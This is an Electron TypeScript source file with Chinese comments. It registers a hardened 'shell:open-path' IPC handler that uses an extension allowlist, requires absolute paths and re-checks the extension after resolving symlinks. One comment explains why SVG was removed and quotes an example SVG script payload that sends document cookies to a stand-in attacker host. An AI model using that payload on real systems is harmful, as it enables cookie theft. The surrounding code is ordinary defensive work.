/**
 * Shell 相关 IPC 处理器
 *
 * 暴露给渲染进程的通道（与 src/shared/ipc/channels.ts 保持同步）：
 *   - shell:open-path   调用系统 shell 打开指定路径（文件管理器 / 默认程序）
 */
import { shell } from 'electron'
import { extname, isAbsolute, resolve } from 'node:path'
import { realpath } from 'node:fs/promises'
import { handle } from './channels'

/** 允许通过 shell.openPath 打开的扩展名（防止被用于执行任意 .bat / .ps1 / .exe） */
const ALLOWED_EXTS = new Set([
  '.md', '.txt', '.json', '.pdf', '.png', '.jpg', '.jpeg', '.gif', '.webp',
  '.mp4', '.mov', '.mp3', '.wav',
  // R23 修复 (medium security)：删 .svg。Windows 默认 .svg 关联到 Edge，
  // Edge 会在 SVG 内执行 `<script>` / `onload=`。realpath + extname 二次
  // 校验已堵掉符号链接绕路，但 SVG 文件本体的脚本执行仍会跑（攻击者写
  // 一个含 <script>fetch('//attacker/?'+document.cookie)</script> 的 svg，
  // 用 TaskPilot 自带的"打开附件"路径触达 Edge → 拿到浏览器 cookie）。
  // 如需 SVG 预览，改在 renderer 内用 <img src=> 渲染（同源 + CSP 隔离）。
])

export function registerShellHandlers(): void {
  /**
   * 在系统文件管理器中打开指定路径。
   * 返回字符串时表示失败信息（Electron shell.openPath 的约定），空字符串表示成功。
   *
   * 安全：仅允许常见文档/媒体扩展名；脚本后缀（.bat/.ps1/.sh/.exe）一律拒绝，
   * 防止渲染端被劫持后通过此 IPC 触发任意代码执行。
   */
  handle('shell:open-path', async (_e, args: { path: string }) => {
    if (!args || typeof args.path !== 'string' || !args.path) {
      throw new Error('path is required')
    }
    // R12 修复 (low)：要求绝对路径（防止任意相对路径逃逸），并解析符号
    // 链接 —— 攻击者可能创建 .md 软链接指向 .exe 来绕过扩展名白名单。
    if (!isAbsolute(args.path)) {
      throw new Error('shell:open-path: 仅允许绝对路径')
    }
    const ext = extname(args.path).toLowerCase()
    if (!ALLOWED_EXTS.has(ext)) {
      throw new Error(`shell:open-path: 不允许的文件类型 '${ext || '(无扩展名)'}'`)
    }
    let real: string
    try {
      real = await realpath(resolve(args.path))
    } catch {
      throw new Error('shell:open-path: 路径不存在或不可读')
    }
    // realpath 后再次校验扩展名（防止符号链接指向不同后缀）
    const realExt = extname(real).toLowerCase()
    if (!ALLOWED_EXTS.has(realExt)) {
      throw new Error(`shell:open-path: 符号链接目标不允许的文件类型 '${realExt || '(无扩展名)'}'`)
    }
    return shell.openPath(real)
  })
}